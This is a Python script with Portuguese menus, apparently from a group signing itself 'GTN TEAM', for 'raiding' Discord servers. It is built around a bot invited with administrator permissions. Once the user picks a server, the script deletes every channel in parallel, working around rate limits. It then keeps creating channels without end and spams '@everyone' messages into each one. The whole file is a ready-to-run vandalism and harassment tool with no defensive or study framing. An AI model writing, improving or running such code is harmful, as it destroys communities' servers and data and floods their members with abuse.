
import os
import sys
import asyncio
import discord
from discord.ext import commands
import time
import webbrowser
import platform


SISTEMA = platform.system()
IS_TERMUX = "com.termux" in os.environ.get("TERMUX_VERSION", "")


def instalar_dependencias():
    try:
        import discord
    except ImportError:
        print("[!] Instalando discord.py...")
        os.system("pip install discord.py")
        print("[+] Discord.py instalado com sucesso!")
        os.execv(sys.executable, [sys.executable] + sys.argv)

instalar_dependencias()


def carregar_token():
    try:
        with open("config.txt", "r") as f:
            token = f.read().strip()
            if token:
                return token
            else:
                print("[!] Arquivo config.txt está vazio!")
                print("[!] Coloque o token do bot dentro do arquivo e reinicie.")
                sys.exit(1)
    except FileNotFoundError:
        print("[!] Arquivo config.txt não encontrado!")
        print("[!] Crie um arquivo chamado 'config.txt' na mesma pasta e cole o token dentro.")
        print("[!] Exemplo: echo 'SEU_TOKEN_AQUI' > config.txt")
        sys.exit(1)


def carregar_whitelist():
    try:
        with open("whitelist.txt", "r") as f:
            ids = []
            for line in f:
                line = line.strip()
                if line.isdigit():
                    ids.append(int(line))
            if ids:
                print(f"[+] Whitelist carregada: {len(ids)} servidores protegidos")
                return ids
            else:
                print("[!] Arquivo whitelist.txt está vazio ou inválido!")
                print("[!] Nenhum servidor será protegido.")
                return []
    except FileNotFoundError:
        print("[!] Arquivo whitelist.txt não encontrado!")
        print("[!] Criando whitelist vazia. Nenhum servidor será protegido.")
        return []


token = carregar_token()
WHITELIST = carregar_whitelist()


def limpar_tela():
    if IS_TERMUX or SISTEMA == "Linux":
        os.system("clear")
    elif SISTEMA == "Windows":
        os.system("cls")
    else:
        os.system("clear")

limpar_tela()


if SISTEMA == "Windows":
    RED = ""
    WHITE = ""
    BLACK = ""
    GREEN = ""
    YELLOW = ""
    CYAN = ""
    RESET = ""
else:
    RED = "\033[38;2;255;91;91m"
    WHITE = "\033[97m"
    BLACK = "\033[30m"
    GREEN = "\033[38;2;0;255;0m"
    YELLOW = "\033[38;2;255;255;0m"
    CYAN = "\033[38;2;0;255;255m"
    RESET = "\033[0m"

opcoes = [
    "[01] RAID",
    "[02] CONVIDAR BOT",
    "[03] EM BREVE",
    "[00] SAIR"
]

titulo = "OPÇOES"
largura = max(len(opcao) for opcao in opcoes) + 6

def menu_principal():
    limpar_tela()
    print(f"{RED}┏{'━' * largura}┓{RESET}")
    print(f"{RED}┃{WHITE}{titulo:^{largura}}{RED}┃{RESET}")
    print(f"{RED}┣{'━' * largura}┫{RESET}")
    for opcao in opcoes:
        print(f"{RED}┃ {WHITE}{opcao:<{largura-2}}{RED}┃{RESET}")
    print(f"{RED}┗{'━' * largura}┛{RESET}")
    print(f"{CYAN}[+] Sistema: {SISTEMA}{RESET}")
    if IS_TERMUX:
        print(f"{CYAN}[+] Modo: Termux (Android){RESET}")
    if WHITELIST:
        print(f"{CYAN}[+] Whitelist ativa: {len(WHITELIST)} servidores protegidos{RESET}")
    else:
        print(f"{YELLOW}[!] Whitelist vazia - TODOS os servidores serão atacados{RESET}")

async def delete_channels_fast(guild):
    channels = list(guild.channels)
    if not channels:
        return
    
    print(f"{CYAN}[+] Deletando {len(channels)} canais em paralelo...{RESET}")
    
    semaphore = asyncio.Semaphore(3)
    
    async def delete_one(channel):
        async with semaphore:
            try:
                await channel.delete()
                print(f"{RED}[-] Canal deletado: {channel.name}{RESET}")
                await asyncio.sleep(0.2)
                return True
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.response.headers.get('Retry-After', 1))
                    print(f"{YELLOW}[!] Rate limit, aguardando {retry_after}s...{RESET}")
                    await asyncio.sleep(retry_after + 0.5)
                    try:
                        await channel.delete()
                        print(f"{RED}[-] Canal deletado (retry): {channel.name}{RESET}")
                        return True
                    except:
                        print(f"{YELLOW}[!] Falha ao deletar (retry): {channel.name}{RESET}")
                        return False
                else:
                    print(f"{YELLOW}[!] Falha ao deletar: {channel.name} - {e}{RESET}")
                    await asyncio.sleep(0.5)
                    return False
            except:
                print(f"{YELLOW}[!] Erro desconhecido: {channel.name}{RESET}")
                await asyncio.sleep(0.5)
                return False
    
    tasks = [delete_one(ch) for ch in channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    deleted = sum(1 for r in results if r is True)
    print(f"{GREEN}[+] {deleted} canais deletados com sucesso{RESET}")

async def spam_em_canal(canal):
    for i in range(7):
        try:
            await canal.send("@everyone GTN TEAM")
            await asyncio.sleep(0.8)
        except:
            await asyncio.sleep(0.8)

async def criar_canais_continuamente(guild):
    contador = 0
    while True:
        try:
            canal = await guild.create_text_channel("by-gtn-team")
            contador += 1
            print(f"{GREEN}[+] Canal criado: {canal.name} (#{contador}){RESET}")
            asyncio.create_task(spam_em_canal(canal))
            await asyncio.sleep(0.8)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.response.headers.get('Retry-After', 1))
                print(f"{YELLOW}[!] Rate limit, aguardando {retry_after}s...{RESET}")
                await asyncio.sleep(retry_after + 1)
            else:
                await asyncio.sleep(1)
        except:
            await asyncio.sleep(1)

async def raid_server(guild):
    print(f"{CYAN}[+] Iniciando RAID no servidor: {guild.name}{RESET}")
    
    await delete_channels_fast(guild)
    
    print(f"{GREEN}[+] Iniciando criacao continua de canais...{RESET}")
    tarefas_criacao = []
    for _ in range(2):
        tarefas_criacao.append(criar_canais_continuamente(guild))
    await asyncio.gather(*tarefas_criacao)

def listar_servidores_sync():
    limpar_tela()
    
    intents = discord.Intents.default()
    intents.guilds = True
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents)
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    @bot.event
    async def on_ready():
        print(f"{GREEN}[+] Bot logado como {bot.user}{RESET}")
        
        # FILTRA SERVIDORES PELA WHITELIST
        servidores_filtrados = [g for g in bot.guilds if g.id not in WHITELIST]
        
        # MOSTRA QUANTOS SERVIDORES FORAM FILTRADOS
        if WHITELIST:
            print(f"{CYAN}[+] {len(servidores_filtrados)} servidores disponiveis (excluidos {len(bot.guilds) - len(servidores_filtrados)} da whitelist){RESET}")
        
        if not servidores_filtrados:
            print(f"{RED}[!] Nenhum servidor disponivel para ataque.{RESET}")
            if WHITELIST:
                print(f"{YELLOW}[!] Todos os servidores estao na whitelist ou nao ha servidores.{RESET}")
            await bot.close()
            return
        
        print(f"\n{WHITE}╔{'═' * 50}╗{RESET}")
        print(f"{WHITE}║{'SERVERS DISPONIVEIS':^50}║{RESET}")
        print(f"{WHITE}╠{'═' * 50}╣{RESET}")
        for idx, guild in enumerate(servidores_filtrados, 1):
            print(f"{WHITE}║ {BLACK}[{idx}] {guild.name:<45}{WHITE}║{RESET}")
        print(f"{WHITE}╚{'═' * 50}╝{RESET}")
        
        while True:
            try:
                escolha_server = input(f"\n{WHITE}Selecione o numero do servidor: {RESET}")
                idx = int(escolha_server) - 1
                if 0 <= idx < len(servidores_filtrados):
                    guild_escolhido = servidores_filtrados[idx]
                    print(f"{GREEN}[+] Servidor selecionado: {guild_escolhido.name}{RESET}")
                    
                    limpar_tela()
                    await raid_server(guild_escolhido)
                    
                    await bot.close()
                    break
                else:
                    print(f"{RED}[!] Numero invalido.{RESET}")
            except ValueError:
                print(f"{RED}[!] Digite um numero valido.{RESET}")
    
    try:
        loop.run_until_complete(bot.start(token))
    except discord.LoginFailure:
        print(f"{RED}[!] Token invalido. Verifique o config.txt{RESET}")
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrompido.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Erro: {e}{RESET}")
    finally:
        try:
            loop.run_until_complete(bot.close())
        except:
            pass
        loop.close()

# LOOP PRINCIPAL
while True:
    try:
        menu_principal()
        escolha = input("Selecione alguma opção: ")
        
        if escolha == "1":
            listar_servidores_sync()
            input("\nPressione Enter para continuar...")
            
        elif escolha == "2":
            limpar_tela()
            link = "https://discord.com/oauth2/authorize?client_id=1516497216573804554&permissions=8&integration_type=0&scope=bot"
            try:
                webbrowser.open(link)
            except:
                print(f"{YELLOW}[!] Navegador nao suportado. Acesse manualmente:{RESET}")
                print(f"{CYAN}{link}{RESET}")
            print(f"{GREEN}[+] Link aberto no navegador{RESET}")
            input("\nPressione Enter para continuar...")
            
        elif escolha == "3":
            limpar_tela()
            print(f"{YELLOW}[!] Em breve{RESET}")
            input("\nPressione Enter para continuar...")
            
        elif escolha == "0":
            limpar_tela()
            print(f"{RED}[!] Saindo...{RESET}")
            break
            
        else:
            print(f"{RED}[!] Escolha nao encontrada{RESET}")
            input("\nPressione Enter para continuar...")
            
    except KeyboardInterrupt:
        print(f"\n{RED}[!] flw bro{RESET}")
        break
    except Exception as e:
        print(f"{RED}[!] Erro: {e}{RESET}")
        input("\nPressione Enter para continuar...")
